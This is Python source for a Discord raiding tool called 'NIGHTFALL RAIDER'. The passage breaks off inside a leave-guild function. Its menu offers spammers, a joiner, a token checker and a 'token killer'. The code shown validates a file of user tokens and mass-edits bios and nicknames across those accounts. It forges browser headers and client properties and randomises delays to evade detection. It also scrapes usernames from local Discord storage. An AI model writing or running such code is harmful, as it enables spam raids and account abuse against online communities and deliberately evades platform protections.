# fucker free shit stuff
# Under the MIT License



import os
import winsound
import random
import string
import re
from pypresence import Presence
from pathlib import Path
import requests
from shutil import get_terminal_size
from itertools import cycle
import ctypes
import ssl
import websocket as ws
from pystyle import Colorate, Colors
import logging
import time
from threading import Thread
import yaml
import threading
import json
import signal
import sys
import atexit
import base64


spam_threads = []
spam_active = False
typing_threads = []
typing_active = False

# F 
def random_string(length=8, chars=None):
    if chars is None:
        chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

# VALUEs
SOFTWARE_TYPE = "NIGHTFALL RAIDER"
STATUS = "Released"
VERSION = f"0.0.1-{random_string()}"
DEVELOPER_TEAM = "4levy"
INVITE_LINK = "TSdpyMMfrU"
DISCORD_INVITE = f"https://discord.gg/{INVITE_LINK}" 
CLIENT_ID = '1408702513619669082'
IMAGE_URL = [ # Support gif btw
    "https://i.postimg.cc/cJ45Kqn0/1b60e2fd40d814ac5dd08ceb6bd5f933(1).png"
]



# Art

MAINBANNER = f""" 
                                    ::                                                             
                                -+*#+#*@@%@%#+===++**###*#***++=:.                                 
                            ##@@@@@@@@@@@@@@@@%@@@@@%@%=.   ..                                     
                            .@@@@@@@@@@@@@@@%%%%%###*#++*++==--**=:.     .                            
                        :@@@@@@@@##*@%#%%##%*==-=+=++++#++==::.. ..     =.                          
                        @@@@@@@@@%#@%#*###%#@#*#@+=+*+=++++-.   +.                 :                 
                    =@@@@@@@*#@@@*%#+=%@%%#%%*##%++*#****+=+=:.      :.                            
                    *%@%##%@%*+*%@@@@%@@#*+++---:=:=*===-=-::.=:                                    
                    @@@@@*@%%%###**####%%######*++==-:::-===-=:     :.                               
                    @@@@@#@##@%@@@@@@++*+=**+#*+=+=*+-+---.: #--.::       :               .           
                .@@@%%**@@@@@@@@@@@@##*++-:+++:-:.+-::..... ..-:  .         .                       
                @%@@@#%@%*%@@@@@@@@@@@++=+=--...-.::. -::....  :   :             .                   
                @@@@@@##%%%@@@@@@@@@+%@%*+===--:::.--..: :.. .  ..     :                              
            -@@@@%##==*%@@@@%%@@@%@+--=+=+:--=+--:::. .-  =.            :                           
            %@@%@@%#++#%@@@@@@%@@@@@%*---%---    =.-.. .                    .                        
    ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓

    {Colors.turquoise}[ 1 ]{Colors.reset} - {Colors.light_red}Joiner{Colors.reset}                  {Colors.turquoise}[ 8 ]{Colors.reset}  - {Colors.light_red}Bio Changer{Colors.reset}                {Colors.turquoise}[ 15 ]{Colors.reset} - {Colors.light_red}Invite Create Spammer{Colors.reset}
    {Colors.turquoise}[ 2 ]{Colors.reset} - {Colors.light_red}Leaver{Colors.reset}                  {Colors.turquoise}[ 9 ]{Colors.reset}  - {Colors.light_red}Join Voice Channel{Colors.reset}         {Colors.turquoise}[ 16 ]{Colors.reset} - {Colors.light_red}Disconnect VC{Colors.reset}                
    {Colors.turquoise}[ 3 ]{Colors.reset} - {Colors.light_red}Spammer{Colors.reset}                 {Colors.turquoise}[ 10 ]{Colors.reset} - {Colors.light_red}Change Nickname{Colors.reset}                 
    {Colors.turquoise}[ 4 ]{Colors.reset} - {Colors.light_red}Token Checker{Colors.reset}           {Colors.turquoise}[ 11 ]{Colors.reset} - {Colors.light_red}Thread Create Spammer{Colors.reset}   
    {Colors.turquoise}[ 5 ]{Colors.reset} - {Colors.light_red}Sound Board{Colors.reset}             {Colors.turquoise}[ 12 ]{Colors.reset} - {Colors.light_red}Friending adder{Colors.reset}                
    {Colors.turquoise}[ 6 ]{Colors.reset} - {Colors.light_red}Accept Rules{Colors.reset}            {Colors.turquoise}[ 13 ]{Colors.reset} - {Colors.light_red}Fake Typing{Colors.reset}                     
    {Colors.turquoise}[ 7 ]{Colors.reset} - {Colors.light_red}Token killer{Colors.reset}            {Colors.turquoise}[ 14 ]{Colors.reset} - {Colors.light_red}Call Spammer{Colors.reset}                   

    ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑ 
       *@@@%##%#++*+@@@%@@@%%*%%@%#*===:-::    ..    .       .                                    
    *%%@@#=*##*%+****+%*%%%%##.#%%##--=:::: .          -                                          
  =@%@@%==**=..-+**++=---**@#*. ###** -...+.             .                                        
 %@@#%#*=--:-:::+*=*=+--==.**#    ##*- - ..-                                                      
%%#**##=----::.. .:**=---=  -=:         ..                                                        
++#+=-:...:=-=+=.:.:.:.=.                                                                         
*++%%:. .-=++*+=+::-::.     :  :                                                                  
-=+-*+=-:..-+#*#+=  ---.                                                                          
=- .::::.+-+   ==- .         .                                                                    
:.=+=*=*=-                                                                                        
--=.***#++:                   .                                                                   
+*==:..+=--                                                                                       
  -..:.                                                                                           
:  :...                                              .                                            
-.    .                                                                                           
::                                                                                                
.:                                                                                                


"""

LOADER = """
                      @@@@@          -@@@@                        
                     @@@%*#%%@     .@@@@@@@      - {nightfall}                 
                     -@@@@%@@@@#   @@@@@@@.*     -------------------------           
                     @@@@* @@@@@@@@@@@%@@#@      - {software}                  
                          @@@@@ =+@@             - {dev}                 
                       =@@@@@@@   @%@@@                          
                     +@@%@@@@%     @@@@@@@                         
                    :@@@@@@          -%@%#*@@@                    
                       @@@               @@@@*                    
                        @                                         
"""

dasda = Colorate.Horizontal(Colors.red_to_purple, f"{VERSION}", 1)
dwda = Colorate.Horizontal(Colors.blue_to_purple, SOFTWARE_TYPE, 1)
wdadwd = Colorate.Horizontal(Colors.white_to_blue, DEVELOPER_TEAM, 1)

dopasdkw = LOADER.format(nightfall=dasda, software=dwda, dev=wdadwd)

# # # #

# EEE

chars = string.ascii_letters + string.digits
length = random.randint(5, 10)
title_str = ''.join(random.choice(chars) for _ in range(length))

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def resize_console(width, height):
    if os.name == 'nt':
        try:
            h = ctypes.windll.kernel32.GetStdHandle(-11)
            ctypes.windll.kernel32.SetConsoleScreenBufferSize(h, ctypes.wintypes._COORD(width, height))
            rect = ctypes.wintypes.SMALL_RECT(0, 0, width - 1, height - 1)
            ctypes.windll.kernel32.SetConsoleWindowInfo(h, True, ctypes.byref(rect))
        except Exception:
            os.system(f'mode con: cols={width} lines={height}')
    else:
        os.system('clear')

def rename_console():   
    os.system(f'title {title_str}')

def winsound_beep():
    f = 500 
    d = 400
    winsound.Beep(f, d)

# # # #

# # # # 

RPC = Presence(CLIENT_ID)

def get_all_discord_usernames():
    directories = [
        os.getenv('APPDATA') + "\\discord",
        os.getenv('APPDATA') + "\\discordptb",
        os.getenv('APPDATA') + "\\discordcanary",
        os.getenv('LOCALAPPDATA') + "\\discord"
    ]
    
    usernames = set()
    username_pattern = r'"username"\s*:\s*"([^"]+)"'

    for directory in directories:
        try:
            local_storage_path = Path(directory) / "Local Storage" / "leveldb"
            if not local_storage_path.exists():
                continue

            for file_path in local_storage_path.glob("*.ldb"):
                try:
                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        matches = re.finditer(username_pattern, content)
                        for match in matches:
                            username = match.group(1).strip()
                            if 2 <= len(username) <= 32:
                                usernames.add(username)
                except Exception as e:
                    logging.debug(f"Error reading file {file_path}: {e}")

        except Exception as e:
            logging.debug(f"Error accessing directory {directory}: {e}")

    return list(usernames) if usernames else ["Unknown"]  

class ExternalImageHandler:
    def __init__(self, client_id):
        self.client_id = client_id
        
    def is_valid_url(self, url):
        try:
            from urllib.parse import urlparse
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    def is_gif(self, url):
        return url.lower().endswith('.gif') or 'gif' in url.lower()
    
    def get_external_image_formats(self, url):
        if not self.is_valid_url(url):
            return []
        
        formats = []
        is_animated = self.is_gif(url)
        
        if is_animated:
            formats.append(url)
            
            if "cdn.discordapp.com" in url or "media.discordapp.net" in url:
                clean_url = url.split('?')[0]
                formats.append(clean_url)
                formats.append(f"mp:{clean_url}")
            
            if "tenor.com" in url:
                formats.append(url)
                if "/view/" in url:
                    direct_url = url.replace("/view/", "/").replace("-gif", ".gif")
                    formats.append(direct_url)
            
            if "imgur.com" in url:
                if not url.endswith('.gif'):
                    gif_url = url + '.gif'
                    formats.append(gif_url)
                    
                if not url.startswith('https://i.imgur.com'):
                    img_id = url.split('/')[-1].replace('.gif', '')
                    direct_gif = f"https://i.imgur.com/{img_id}.gif"
                    formats.append(direct_gif)

            formats.append(f"mp:{url}")
            
        else:
            formats.append(url)
            
            formats.append(f"mp:{url}")
            
            if "cdn.discordapp.com" in url or "media.discordapp.net" in url:
                clean_url = url.split('?')[0]
                formats.append(clean_url)
                formats.append(f"mp:{clean_url}")
        
        try:
            import hashlib
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            formats.append(f"external_{url_hash}")
        except:
            pass
        
        return formats
    
    def get_images(self, url1=None, url2=None):
        result = {"big_image": None, "small_image": None}
        
        if url1:
            url1 = url1 if self.is_valid_url(url1) else None
        if url2:
            url2 = url2 if self.is_valid_url(url2) else None
        
        if not url1 and not url2:
            return result
        
        if url1:
            big_formats = self.get_external_image_formats(url1)
            result["big_image"] = big_formats
        
        if url2:
            small_formats = self.get_external_image_formats(url2)
            result["small_image"] = small_formats
            
        return result

def is_valid_url(url):
    try:
        from urllib.parse import urlparse
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def initialize_rpc():
    try:
        rpc = Presence(CLIENT_ID)
        rpc.connect()
        start_time = int(time.time())

        image_handler = ExternalImageHandler(CLIENT_ID)

        def update_rpc():
            current_image_index = 0
            while True:
                usernames = get_all_discord_usernames()
                username_display = ", ".join(usernames)
                if len(username_display) > 100: 
                    username_display = username_display[:97] + "..."

                image_url = IMAGE_URL[current_image_index % len(IMAGE_URL)]
                current_image_index += 1
                
                if image_handler.is_gif(image_url):
                    pass
                
                image_formats = image_handler.get_external_image_formats(image_url)
                
                success = False
                for i, image_format in enumerate(image_formats):
                    if success:
                        break
                        
                    try:
                        rpc.update(
                            state=f"Dev | {DEVELOPER_TEAM}",
                            details=f"{SOFTWARE_TYPE} | {STATUS} | {username_display}",
                            large_image=image_format,
                            large_text=f"Version: {VERSION}",
                            start=start_time
                        )
                        success = True
                        
                    except Exception as e:
                        continue
                
                if not success:
                    try:
                        rpc.update(
                            state=f"Dev | {DEVELOPER_TEAM}",
                            details=f"{SOFTWARE_TYPE} | {STATUS} | {username_display}",
                            large_text=f"Version: {VERSION}",
                            start=start_time
                        )
                    except Exception as fallback_error:
                        pass

                time.sleep(15)

        Thread(target=update_rpc, daemon=True).start()

    except Exception as e:
        console_logger(f"Discord RPC Connection Error: {e}", "error")
        console_logger(f"Discord RPC Connection Error: {e}", "error")
        
    #end 

class DotLoader:
    def __init__(self, desc="Initializing : ", end="^ Initialization Complete!", timeout=0.3):
        self.desc = desc
        self.end = end
        self.timeout = timeout

        self.steps = ["!", "<", ">", ".", "-", ";", ",", "+"]
        self.done = False
        self._thread = Thread(target=self._animate, daemon=True)

    def start(self):
        self._thread.start()
        return self

    def _animate(self):
        for c in cycle(self.steps):
            if self.done:
                break
            print(f"\r{self.desc}{c}", end="", flush=True)
            time.sleep(self.timeout)

    def stop(self):
        self.done = True
        cols = get_terminal_size((80, 20)).columns
        print("\r" + " " * cols, end="", flush=True)
        print(f"\r{self.end}", flush=True)

# # # #


# Fucker Functions

def console_logger(message, level="info"):
    colors = {
        "info": Colors.white,       # White instead of cyan
        "success": Colors.green,    # Green  
        "warning": Colors.yellow,   # Yellow
        "error": Colors.red,        # Red
        "debug": Colors.gray,       # Gray
        "reset": Colors.reset       # Reset
    }
    
    timestamp = time.strftime("%H:%M:%S")
    color = colors.get(level, colors["info"])
    print(f"{Colors.white}[{timestamp}]{Colors.reset} - {color}{message}{colors['reset']}")


def mask_token(token):
    if len(token) > 8:
        return f"{token[:8]}****"
    return "****"


def load_tokens_from_file():
    try:
        file_path = "DATA/Value.yml"
        if not os.path.exists(file_path):
            console_logger(f"Token file not found: {file_path}", "error")
            return []
            
        with open(file_path, 'r', encoding='utf-8') as file:
            data = yaml.safe_load(file)
            
        if 'TOKENS' not in data:
            console_logger("No TOKENS key found in YAML file", "error")
            return []
            
        tokens_string = data['TOKENS']
        if not tokens_string:
            console_logger("TOKENS section is empty", "warning")
            return []
            
        tokens = [token.strip() for token in tokens_string.split('\n') if token.strip()]
        return tokens
        
    except Exception as e:
        console_logger(f"Error loading tokens: {str(e)}", "error")
        return []

def save_tokens_to_file(tokens):
    try:
        file_path = "DATA/Value.yml"
        
        data = {}
        if os.path.exists(file_path):
            with open(file_path, 'r', encoding='utf-8') as file:
                data = yaml.safe_load(file) or {}
        
        tokens_string = '\n'.join(tokens) if tokens else ''
        data['TOKENS'] = tokens_string
        
        with open(file_path, 'w', encoding='utf-8') as file:
            yaml.dump(data, file, default_flow_style=False, allow_unicode=True)
            
        console_logger(f"Updated YAML file with {len(tokens)} valid tokens", "success")
        return True
        
    except Exception as e:
        console_logger(f"Error saving tokens: {str(e)}", "error")
        return False

def check_token_validity(token):
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
        }

        response = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            user_data = response.json()
            username = user_data.get('username', 'Unknown')
            user_id = user_data.get('id', 'Unknown')
            return True, f"{username} ({user_id})"
        elif response.status_code == 401:
            return False, "Invalid/Expired Token"
        elif response.status_code == 403:
            return False, "Account Locked/Disabled"
        elif response.status_code == 429:
            return False, "Rate Limited (may be valid)"
        else:
            return False, f"HTTP {response.status_code}"
            
    except Exception as e:
        return False, f"Connection Error: {str(e)}"

def token_checker_multi():

    tokens = load_tokens_from_file()
    if not tokens:
        console_logger("No tokens found to check", "error")
        return
    
    console_logger(f"Found {len(tokens)} tokens to validate", "info")
    
    valid_tokens = []
    invalid_tokens = []
    
    for i, token in enumerate(tokens, 1):
        masked_token = mask_token(token)
        
        is_valid, info = check_token_validity(token)
        
        if is_valid:
            valid_tokens.append(token)
            console_logger(f"{masked_token} - VALID - {info}", "success")
        else:
            invalid_tokens.append(token)
            console_logger(f"{masked_token} - INVALID - {info}", "error")
        
        time.sleep(random.uniform(1.0, 2.0))
    
    if invalid_tokens:
        console_logger(f"\nInvalid tokens that will be removed:", "warning")
        for token in invalid_tokens:
            console_logger(f"  - {mask_token(token)}", "warning")
        
        confirm = input(f"\nRemove {len(invalid_tokens)} invalid tokens from YAML file? (y/n): ").strip().lower()
        
        if confirm in ['y', 'yes']:
            if save_tokens_to_file(valid_tokens):
                console_logger(f"Successfully removed {len(invalid_tokens)} invalid tokens!", "success")
                console_logger(f"YAML file now contains {len(valid_tokens)} valid tokens", "success")
            else:
                console_logger("Failed to update YAML file", "error")
        else:
            console_logger("Token removal cancelled - YAML file unchanged", "info")
    else:
        console_logger("All tokens are valid! No cleanup needed.", "success")

# Bio Changer
def bio_changer_multi(new_bio):
    tokens = load_tokens_from_file()
    
    if not tokens:
        console_logger("No tokens found to process", "error")
        return
        
    
    success_count = 0
    failed_count = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    
    for i, token in enumerate(tokens, 1):
        masked_token = mask_token(token)
        console_logger(f"{masked_token}")
        
        delay = random.uniform(2.0, 6.0)
        time.sleep(delay)
        
        url = "https://discord.com/api/v9/users/@me/profile"
        
        user_agent = random.choice(user_agents)
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Discord-Locale": "en-US",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MzgxNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }
        
        payload = {
            "bio": new_bio
        }
        
        try:
            session = requests.Session()
            session.headers.update(headers)
            
            response = session.patch(url, json=payload, timeout=30)
            
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401 Unauthorized)", "error")
                failed_count += 1
            elif response.status_code == 429:
                retry_after = response.headers.get('Retry-After', '60')
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_after}s...", "warning")
                time.sleep(int(retry_after) + random.uniform(1, 3))
                failed_count += 1
            elif response.status_code == 403:
                console_logger(f"{masked_token} - Forbidden (403) - Account may be restricted", "error")
                failed_count += 1
            else:
                console_logger(f"{masked_token} - Failed with status {response.status_code}", "error")
                failed_count += 1
                
            session.close()
                
        except requests.exceptions.Timeout:
            console_logger(f"{masked_token} - Request timeout", "error")
            failed_count += 1
        except requests.exceptions.ConnectionError:
            console_logger(f"{masked_token} - Connection error", "error")
            failed_count += 1
        except Exception as e:
            console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
            failed_count += 1
    
    console_logger(f"Bio change completed! Success: {success_count}, Failed: {failed_count}", "info")

def bio_changer(token, new_bio):
    url = "https://discord.com/api/v9/users/@me/profile"
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    payload = {
        "bio": new_bio
    }
    
    response = requests.patch(url, headers=headers, json=payload)
    
    if response.status_code == 200:
        console_logger("Bio changed successfully!", "success")
    else:
        console_logger(f"Failed to change bio: {response.status_code}", "error")
        console_logger(response.text, "debug")

# Nickname/Global Name Changer
def nickname_changer_multi(new_nickname):
    tokens = load_tokens_from_file()
    
    if not tokens:
        console_logger("No tokens found to process", "error")
        return
        
    success_count = 0
    failed_count = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
    ]
    
    def generate_super_properties():
        os_versions = ["10", "11"]
        chrome_versions = ["131.0.0.0", "130.0.0.0", "129.0.0.0"]
        firefox_versions = ["133.0", "132.0", "131.0"]
        
        is_chrome = random.choice([True, False])
        os_version = random.choice(os_versions)
        
        if is_chrome:
            browser_version = random.choice(chrome_versions)
            browser = "Chrome"
            user_agent_browser = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{browser_version} Safari/537.36"
        else:
            browser_version = random.choice(firefox_versions)
            browser = "Firefox"
            user_agent_browser = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{browser_version}) Gecko/20100101 Firefox/{browser_version}"
        
        build_numbers = [435396, 435000, 434500, 434000]
        build_number = random.choice(build_numbers)
        
        super_props = {
            "os": "Windows",
            "browser": browser,
            "device": "",
            "system_locale": "en-US",
            "browser_user_agent": user_agent_browser,
            "browser_version": browser_version,
            "os_version": os_version,
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": build_number,
            "client_event_source": None
        }
        
        import base64
        return base64.b64encode(json.dumps(super_props, separators=(',', ':')).encode()).decode()
    
    for i, token in enumerate(tokens, 1):
        masked_token = mask_token(token)
        console_logger(f"[{i}/{len(tokens)}] Changing nickname for {masked_token}...", "info")
        
        delay = random.uniform(8.0, 18.0)
        time.sleep(delay)
        
        url = "https://discord.com/api/v9/users/@me"
        
        user_agent = random.choice(user_agents)
        super_properties = generate_super_properties()
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Cache-Control": "no-cache",
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me",
            "Sec-CH-UA": f'"{random.choice(["Google Chrome", "Chromium"])}";"v="{random.randint(128, 131)}", "Not;A=Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": random.choice(["America/New_York", "America/Los_Angeles", "Europe/London", "Asia/Tokyo"]),
            "X-Super-Properties": super_properties,
            "X-Track": random.choice([
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIn0=",
                "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyJ9"
            ])
        }
        
        if new_nickname.strip():
            payload = {
                "global_name": new_nickname.strip()
            }
        else:
            payload = {
                "global_name": None
            }
        
        try:
            session = requests.Session()
            session.headers.update(headers)
            
            time.sleep(random.uniform(0.5, 2.0))
            
            try:
                preflight_headers = dict(headers)
                preflight_headers.pop("Content-Type", None)
                session.get("https://discord.com/api/v9/users/@me", headers=preflight_headers, timeout=15)
                time.sleep(random.uniform(0.3, 1.0))
            except:
                pass 
            
            response = session.patch(url, json=payload, timeout=30)
            
            if response.status_code == 200:
                success_count += 1
                console_logger(f"{masked_token} - Nickname changed successfully to '{new_nickname}'", "success")
                
                time.sleep(random.uniform(0.5, 1.5))
                
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401 Unauthorized)", "error")
                failed_count += 1
            elif response.status_code == 429:
                retry_after = response.headers.get('Retry-After', '60')
                retry_time = int(retry_after) + random.uniform(5, 15)
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_time:.1f}s...", "warning")
                time.sleep(retry_time)
                failed_count += 1
            elif response.status_code == 403:
                console_logger(f"{masked_token} - Forbidden (403) - Account may be restricted or flagged", "error")
                failed_count += 1
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    error_message = error_data.get('message', 'Invalid nickname format')
                    console_logger(f"{masked_token} - Bad request (400) - {error_message}", "error")
                except:
                    console_logger(f"{masked_token} - Bad request (400) - Invalid nickname format or request", "error")
                failed_count += 1
            else:
                console_logger(f"{masked_token} - Failed with status {response.status_code}", "error")
                failed_count += 1
                
            session.close()
            
            if i < len(tokens):
                cooldown = random.uniform(3.0, 8.0)
                time.sleep(cooldown)
                
        except requests.exceptions.Timeout:
            console_logger(f"{masked_token} - Request timeout", "error")
            failed_count += 1
        except requests.exceptions.ConnectionError:
            console_logger(f"{masked_token} - Connection error", "error")
            failed_count += 1
        except Exception as e:
            console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
            failed_count += 1
    
    console_logger(f"Nickname change completed! Success: {success_count}, Failed: {failed_count}", "info")


def server_nickname_changer_multi(guild_id, new_nick):
    tokens = load_tokens_from_file()
    
    if not tokens:
        console_logger("No tokens found to process", "error")
        return
        
    success_count = 0
    failed_count = 0
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]
    
    for i, token in enumerate(tokens, 1):
        masked_token = mask_token(token)
        console_logger(f"[{i}/{len(tokens)}] Changing server nickname for {masked_token}...", "info")
        
        delay = random.uniform(5.0, 12.0)
        time.sleep(delay)
        
        url = f"https://discord.com/api/v9/guilds/{guild_id}/members/@me"
        
        user_agent = random.choice(user_agents)
        
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": user_agent,
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://discord.com",
            "Referer": f"https://discord.com/channels/{guild_id}",
            "Sec-CH-UA": '"Google Chrome";v="131", "Not;A=Brand";v="99"',
            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "X-Discord-Locale": "en-US"
        }
        
        payload = {
            "nick": new_nick
        }
        
        try:
            session = requests.Session()
            session.headers.update(headers)
            
            response = session.patch(url, json=payload, timeout=30)
            
            if response.status_code == 200:
                success_count += 1
                console_logger(f"{masked_token} - Server nickname changed to '{new_nick}'", "success")
            elif response.status_code == 401:
                console_logger(f"{masked_token} - Invalid token (401)", "error")
                failed_count += 1
            elif response.status_code == 403:
                console_logger(f"{masked_token} - No permission (403) - Missing 'Change Nickname' permission", "error")
                failed_count += 1
            elif response.status_code == 404:
                console_logger(f"{masked_token} - Server not found (404) - Not a member or invalid guild ID", "error")
                failed_count += 1
            elif response.status_code == 429:
                retry_after = response.headers.get('Retry-After', '60')
                retry_time = int(retry_after) + random.uniform(2, 5)
                console_logger(f"{masked_token} - Rate limited! Waiting {retry_time:.1f}s...", "warning")
                time.sleep(retry_time)
                failed_count += 1
            elif response.status_code == 400:
                try:
                    error_data = response.json()
                    error_message = error_data.get('message', 'Invalid request')
                    console_logger(f"{masked_token} - Bad request (400) - {error_message}", "error")
                except:
                    console_logger(f"{masked_token} - Bad request (400)", "error")
                failed_count += 1
            else:
                console_logger(f"{masked_token} - Failed with status {response.status_code}", "error")
                failed_count += 1
                
            session.close()
                
        except requests.exceptions.Timeout:
            console_logger(f"{masked_token} - Request timeout", "error")
            failed_count += 1
        except requests.exceptions.ConnectionError:
            console_logger(f"{masked_token} - Connection error", "error")
            failed_count += 1
        except Exception as e:
            console_logger(f"{masked_token} - Unexpected error - {str(e)}", "error")
            failed_count += 1
    
    console_logger(f"Server nickname change completed! Success: {success_count}, Failed: {failed_count}", "info")

# Leave Guild Function
def leave_guild_worker(token, guild_id, success_count, failed_count, lock):
    masked_token = mask_token(token)
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ]
    delay = random.uniform(1.0, 4.0)
